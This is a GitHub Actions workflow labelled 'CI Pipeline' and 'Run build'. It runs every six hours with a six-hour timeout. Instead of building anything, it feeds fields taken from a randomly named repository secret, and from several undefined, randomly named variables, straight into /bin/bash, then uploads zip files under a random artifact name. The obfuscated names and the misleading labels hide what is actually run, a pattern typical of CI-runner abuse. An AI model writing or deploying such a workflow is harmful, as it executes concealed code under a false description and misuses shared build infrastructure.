name: CI Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '46 4,10,16,22 * * *'
permissions:
  contents: read
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  perform:
    name: Run build
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Run build
        env:
          gzxa36900: ${{ secrets.gzxa36900 }}
        run: |
          printf '%s' "$gzxa36900" | jq -r .koy6 | /bin/bash
          printf '%s' "$bqx3782" | jq -r .huizw49155 | /bin/bash
          echo $gwx1966 | jq -r .xstkx1981 | /bin/bash
          echo $uk81 | jq -r .v2 | /bin/bash
          printf '%s' "$ehy11" | jq -r .je2 | /bin/bash

      - name: Save archive
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: iHBbhXbH
          path: "*.zip"
          retention-days: 1
